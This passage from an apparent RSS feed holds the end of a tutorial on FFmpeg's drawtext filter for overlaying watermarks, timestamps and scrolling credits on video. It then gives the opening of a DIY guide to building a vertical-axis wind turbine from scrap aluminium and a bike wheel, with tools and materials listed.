<ul><li><code>inputClip.mp4</code>&nbsp;is the input video on which you want to display the text; and the output (containing the text) is to be stored in&nbsp;<code>output.mp4</code></li><li>no audio re-encoding as indicated by&nbsp;<code>-c:a copy</code></li><li>we use the drawtext filter as indicated by the commands&nbsp;<code>-vf "drawtext=........"</code></li><li><code>text='My text starting at 640x360'</code>&nbsp;is the text that will be shown on the video (you could make it your name for watermarking the video, right?)</li><li>position of the text<ul><li><code>x=640:y=360</code>&nbsp;indicates that the x and y coordinates as&nbsp;<code>640px</code>&nbsp;and&nbsp;<code>360px</code>. Also, as a side note, the video’s resolution is&nbsp;<code>1280x720</code>.</li><li>font size is&nbsp;<code>24</code></li><li>font color is&nbsp;<code>white</code></li></ul></li></ul>



<p>Let’s see how the output looks, shall we?</p>



<div><figure><img data-attachment-id="90" data-permalink="https://ottverse.com/drawtext-filter-basic-example/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?fit=960%2C538&amp;ssl=1" data-orig-size="960,538" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-filter-basic-example" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?fit=960%2C538&amp;ssl=1" loading="lazy" width="960" height="538" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=768%2C430&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>A better way to this is to offset the text by the length of the text that you are printing on the screen.</p>



<p>Confused?</p>



<p>If you look at the image above, you’ll see that it starts at the center of the video and extends towards the right.</p>



<p><strong>If you want to center the text itself, then you can subtract the height and width of the rendered text when telling&nbsp;<code>drawtext</code>&nbsp;where to render the text.</strong></p>



<p>Here’s how. You use the command&nbsp;<code>x=(w-text_w)/2:y=(h-text_h)/2</code>&nbsp;and it will center the text. Here is our new commandline –</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='Centered Text':x=(w-text_w)/2:y=(h-text_h)/2:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Now, the text looks nice and pretty 🙂</p>



<div><figure><img data-attachment-id="78" data-permalink="https://ottverse.com/centered-text/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?fit=960%2C536&amp;ssl=1" data-orig-size="960,536" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="centered-text" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?fit=960%2C536&amp;ssl=1" loading="lazy" width="960" height="536" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=960%2C536&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=768%2C429&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=960%2C536&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p><strong>Fantastic – you now know how to overlay text onto a video using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter. Do you think you can add your own watermark or copyright? Let’s try 🙂</strong></p>



<h2 id="adding-a-copyright-notice-or-text-watermark-using-ffmpegs-drawtext-filter"><span id="Adding_a_Copyright_notice_or_Text_Watermark_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding a Copyright notice or Text Watermark using FFmpeg’s drawtext filter<span></span></h2>



<p>Let’s modify the command as follows to indicate my name and the copyright symbol.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>This produces an output like this – looks good right? You can play around with the&nbsp;<code>x</code>&nbsp;and&nbsp;<code>y</code>&nbsp;coordinates to align the text the way you want to.</p>



<div><figure><img data-attachment-id="92" data-permalink="https://ottverse.com/drawtext-with-copyright/" data-orig-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?fit=960%2C541&amp;ssl=1" data-orig-size="960,541" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-with-copyright" data-image-description="" data-medium-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?fit=960%2C541&amp;ssl=1" loading="lazy" width="960" height="541" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=960%2C541&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?w=960&amp;ssl=1 960w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=768%2C433&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=960%2C541&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h2 id="adding-text-with-background-color-using-ffmpegs-drawtext-filter"><span id="Adding_Text_with_Background_Color_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding Text with Background Color using FFmpeg’s drawtext filter<span></span></h2>



<p>To add a background color, we need</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=(1100-text_w):y=(600-text_h):fontsize=32:fontcolor=black:box=1:boxcolor=white@0.5: boxborderw=5" -c:a copy output.mp4</code></pre>



<p>The new commands here are –</p>



<ul><li><code>box</code>&nbsp;: this is either&nbsp;<code>1</code>&nbsp;(enabled) or&nbsp;<code>0</code>&nbsp;(disabled)</li><li><code>boxcolor:&nbsp;white@0.5</code>&nbsp;implies a white colored box with a 50% opacity.</li><li><code>boxborderw</code>&nbsp;is the width of the box’s border and the border color is taken from&nbsp;<code>boxcolor</code>.</li></ul>



<p>And there you have it, text with a background. In this example, I switched the color of the text to black so that it contrasts well with a light background bounding box (which in-turn contrasts well with a dark background.)</p>



<div><figure><img data-attachment-id="89" data-permalink="https://ottverse.com/drawtext-box-background/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?fit=960%2C538&amp;ssl=1" data-orig-size="960,538" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-box-background" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?fit=960%2C538&amp;ssl=1" loading="lazy" width="960" height="538" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=768%2C430&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h2 id="displaying-timecodes--timestamps-using--ffmpegs-drawtext-filter"><span id="Displaying_TimeCodes_/_TimeStamps_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Displaying TimeCodes / TimeStamps using FFmpeg’s drawtext filter<span></span></h2>



<p>This is a very useful application of the&nbsp;<code>drawtext</code>&nbsp;filter and is used in demonstrating low-latency applications or visual quality testing so that one knows precisely what the timestamps/timecodes are at each time.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: hms}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4</code></pre>



<p>This uses the&nbsp;<code>timestamp</code>&nbsp;and&nbsp;<code>pts</code>&nbsp;options to display time in hour:min:sec format using the&nbsp;<code>hms</code>&nbsp;format specifier. The notations and formatting are complex in my opion! So, a lot of trial and error might be needed before you format your display correctly.</p>



<p>Here is how the video looks. Hope Vimeo shows you the video without a lot of delay 🙂</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/445270549" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>
</div></figure>



<p>And here is the same command, but using the&nbsp;<code>flt</code>&nbsp;option to provide microsecond time accuracy! Fancy 🙂</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: flt}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4
</code></pre>



<figure><img data-attachment-id="91" data-permalink="https://ottverse.com/drawtext-timecode-flt/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?fit=960%2C540&amp;ssl=1" data-orig-size="960,540" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-timecode-flt" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?fit=960%2C540&amp;ssl=1" loading="lazy" width="960" height="540" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=960%2C540&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=768%2C432&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=960%2C540&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<h2 id="display-movie-credits-using-ffmpegs-drawtext-filter"><span id="Display_Movie_Credits_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Display Movie Credits using FFmpeg’s drawtext filter<span></span></h2>



<p>Finally, let’s learn how to show a movie’s credits using the draw text filter. Here are two main concepts that you need to understand.</p>



<ul><li>providing a lot of text: you can’t do this via the commandline, so, you need to read a text file that contains the text. And you can read that using the&nbsp;<code>textfile</code>&nbsp;option.</li><li>and, specify the speed of scrolling using the&nbsp;<code>y</code>&nbsp;text position. Here, you can provide an equation instead of a constant number. You start off by telling by FFmpeg that the y-position is&nbsp;<code>h - 80*t</code>&nbsp;so that everytime the value of time increases, the value of&nbsp;<code>h - 80*t*</code>&nbsp;decreases, and the text is displayed higher. Makes sense?</li></ul>



<p><strong>Tip: change&nbsp;<code>80</code>&nbsp;to&nbsp;<code>100</code>&nbsp;or&nbsp;<code>120</code>&nbsp;and see the effect on the scrolling speed.</strong></p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=textfile=credits.txt: x=200: y=h-80*t: fontsize=36:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy outputCredits.mp4
</code></pre>



<p>Here is the output:</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/445276018" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>
</div></figure>



<p>That’s it for this tutorial on using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter to produce dynamic overlays on your videos. It is a very versatile and handy tool that you can use to overlay text, timecodes, credits, copyrights notices on your videos.</p>







<hr>



<p>If you are interested in video compression, <a href="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/">check out our comparison of LCEVC (MPEG5 Part 2) vs H.264/AVC</a>. Stunning results, I tell you 🙂 </p>



<figure><a href="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/"><img data-attachment-id="1006" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/lcevc-vs-avc-featured-image/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?fit=1920%2C1080&amp;ssl=1" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lcevc-vs-avc-featured-image" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?fit=1024%2C576&amp;ssl=1" loading="lazy" width="1024" height="576" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" alt="lcevc avc ffmeg" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1536%2C864&amp;ssl=1 1536w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1200%2C675&amp;ssl=1 1200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=678%2C381&amp;ssl=1 678w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?w=1920&amp;ssl=1 1920w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure>
		
		
		
	</div></div>]]>
            </description>
            <link>https://ottverse.com/ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865755</guid>
            <pubDate>Fri, 23 Oct 2020 03:22:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[$30 DIY Kilowatt Wind Turbine (2017)]]>
            </title>
            <description>
<![CDATA[
Score 182 | Comments 88 (<a href="https://news.ycombinator.com/item?id=24865731">thread link</a>) | @simonpure
<br/>
October 22, 2020 | http://opensourcelowtech.org/wind_turbine.html | <a href="https://web.archive.org/web/*/http://opensourcelowtech.org/wind_turbine.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div>
                               <p>
                  Updated 24 Sept '18<br>
                  Developed by: Daniel Connell<br>
                  English Tutorial Text: Daniel Connell<br>
                  Tutorial Animation: Daniel Connell </p>
                <p><strong>Contents of this tutorial:</strong><br>
  <a href="#desc">Description</a><br>
  <a href="#tools">Tools</a><br>
<a href="#mat">Materials</a><a href="#resources"><br>
Resources</a><br>
  <a href="#steps">Step By Step Instructions<br>
</a><a href="#mount">Configurations and Applications</a></p>
<p><strong><a name="desc" id="desc"></a>Description:</strong></p><p>

  This is a Vertical Axis Wind Turbine which uses wind energy to  drive things like an alternator/generator for producing electricity,  or air and water pumps for cooling, irrigation and similar.<br>
  The  turbine uses the 35-40% mechanically efficient Lenz2 lift+drag  design. It is made almost entirely from scrap materials, and should  cost about $15-$30 for the six vane version, which can be made by two  people in four hours without much effort. <br>
The three vane  version has been successfully survival tested to 80 km/h sustained  winds and the six vane version to 105 km. Both will do more, but  exactly how much has not yet been ascertained. The current longest  running version has been up since early 2014, through reasonable  storms, with no noticeable wear and tear as of yet.</p>
<iframe width="320" height="180" src="https://www.youtube.com/embed/8oe6egO0YOc" frameborder="0" allowfullscreen=""></iframe>

<p>Full power curves have yet to be calculated for this  particular build, but according to Mr Ed Lenz's calculations a six  vane at 0.91 meters diameter and 1.1 meters high with a 90% efficient  alternator should produce at least 130 watts of electricity in a 30  km/h wind, and 1 kilowatt at 60 km/h. </p><p>
The materials  listed in this tutorial are to make the three vane version. Double  everything except the bike wheel for six vanes.
</p>
<p><strong><a name="tools" id="tools"></a>Tools:</strong></p>
        <table>
          <tbody><tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/drill1.jpg" width="80" height="80"></td>
            <td><strong>Power drill</strong></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/6mmbit1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>Metal Drill Bits<br>
    </strong>4mm,  6mm, 10mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/cknife1.jpg" width="80" height="80"></td>
            <td>
            <p><strong>Craft </strong><strong>K</strong><strong>nife </strong><strong>or</strong><strong> Stanley </strong><strong>K</strong><strong>nife / </strong><strong>Box  Cutter<br>
            </strong><strong><span>The former is better for  cutting paper, the latter for scoring the aluminium sheets, so one of  each may be a good idea.</span></strong></p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/anglealu1.jpg" width="80" height="80"></td>
            <td><strong>20mm x 20mm angle aluminium</strong>            <br>
            About 1 meter long, an extra 30cm length is also handy. To be used for ruling and bending.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/tapemeasure1.jpg" width="80" height="80"></td>
            <td><strong>Tape Measure</strong></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/riveter1.jpg" width="80" height="80"></td>
            <td><strong>Pop Riveter</strong></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/sharpie1.jpg" width="80" height="80"></td>
            <td><p><strong>Marker Pen</strong></p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/stickytape1.jpg" width="80" height="80"></td>
            <td><p><strong>Sticky Tape</strong></p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/peg1.jpg" alt="" width="80" height="80"></td>
            <td><strong>4 Clothes Pegs</strong><br>
              Springy or the other kind.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/printer1.jpg" alt="" width="80" height="80"></td>
            <td><strong>Computer and printer</strong><br>
Low quality black and  white is fine.<br>
And 2 pieces of A4 or US Letter paper.</td>
          </tr>
          <tr>
            <td>              <p><strong>Optional:</strong></p></td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/7mmsocket1.jpg" alt="" width="80" height="80"></td>
            <td>
              
              
              <p><strong>7mm Socket / Nut Driver<br>
              </strong>For use with the drill to tighten your  bolts. Much faster and easier.</p></td>
          </tr>
        </tbody></table>
        <p><a name="mat" id="mat"></a><strong>Materials:</strong></p>
<table>
          <tbody><tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/aluplate1.jpg" width="80" height="80"></td>
            <td><strong>11 Aluminium lithographic offset printing plates<br>
            </strong>These are pure aluminium sheets used in a printing process fairly common with newspapers and packaging. A medium sized printing company may recycle hundreds of plates every week, so it's usually easy to pick them up cheap. Ring around any local companies offering offset printing.<br>
Any size, thickness, or type is fine as long as they're larger than 67cm on the long axis.
              They'll probably be quite inky when you get them, it washes off your hands easily enough with soap and should be non toxic.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/rivet1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>150</strong><strong> 4mm </strong><strong>D</strong><strong>iameter </strong><strong>P</strong><strong>op </strong><strong>R</strong><strong>ivets</strong> <br>
              About 6-8mm  long. </p>
              </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/m4bolt1.jpg" width="80" height="80"></td>
            <td><p><strong>1</strong><strong>8</strong><strong> M4 </strong><strong>B</strong><strong>olts / </strong><strong>Machine  Screws<br>
            </strong>About 12-20mm long, hex heads are best.</p>
              </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/nylock1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>1</strong><strong>8</strong><strong> M4 </strong><strong>N</strong><strong>yl</strong><strong><strong>ocs</strong></strong><strong> / </strong><strong>Lock Nuts<br>
  </strong>These are nuts with a ring of nylon to  stop them rattling loose. If you can't find these a normal M4 nut  with a spring washer will do the same job.</p>
</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/washer2.jpg" alt="" width="80" height="80"></td>
            <td><strong>24 Small Washers  <br>
            </strong>            4mm inner diameter to fit the pop rivets and bolts, outer diameter about 10mm.<br>            </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/pennywasher1.jpg" alt="" width="80" height="80"></td>
            <td>
              <p><strong>27 Large/Penny/Repair </strong><strong>W</strong><strong>ashers</strong> <br>
      4mm inner  diameter to fit the pop rivets and bolts, outer diameter about 20mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/bikewheel1.jpg" width="80" height="80"></td>
            <td><p><strong>26 Inch </strong><strong>B</strong><strong>ike </strong><strong>W</strong><strong>heel<br>
              </strong>Exactly how  bike wheels are measured is slightly complicated, basically you want  one which is about 58cm total outer rim diameter, give or take. <br>
              The  wheel should:<br>
              ~ Not be quick release <br>
              ~ Have a normal thick  axle (about 10mm diameter)<br>
              ~ Have 36 spokes<br>
              ~ Run reasonably  smoothly <br>
              ~ Have enough axle showing to attach to your pole  mount, at least 3-4cm.<br>
            ~ Only needs gears if you're going to be running a chain off them, which you probably aren't.</p>              <p>It may be helpful to take the wheel  hub apart using spanners and a bike cone spanner and give the  bearings a bit of a clean and re-grease, and to extend the axle as  much as possible on one side for attaching. If you've not done this  before take it along to your local bike servicing place and they'll  be happy to show you how. Shouldn't be necessary tho if the wheel  runs nicely enough and has enough axle showing.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/spokes1.jpg" width="80" height="80"></td>
            <td><strong>12 bike wheel spokes</strong>
            <p>Any length, type, or condition is fine.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/flatsteel1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>2 </strong><strong>S</strong><strong>trips of </strong><strong>S</strong><strong>teel</strong><br>
      Roughly 20cm x 3cm x 3mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/bikeaxle1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>Spare B</strong><strong>ike Wheel Axle and  Three Nuts To Fit</strong><br>
      Anything as long as it's the same thread  as the axle on your wheel.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/m6bolt1.jpg" width="80" height="80"></td>
            <td><p><strong>3 M6 x About 60mm Bolts and Nuts<br>
            </strong><span>You'll  want them with small hex heads.</span></p>
              </td>
          </tr>
        </tbody></table>
<h3><a name="resources" id="steps2"></a>Resources:</h3>

<p><a name="steps" id="steps"></a>
<strong>Step by step build instructions:</strong></p>
<p>These relate to the animation to the left. </p>
<p><strong>Step 1:</strong><br>
  Download and print the two template  files from the links above. Make sure they're printed at 100% (200  dpi). When printed measure the distance between the dimension arrows,  it should be 10cm on both pages. If it's a couple mm off that's  probably ok.</p>
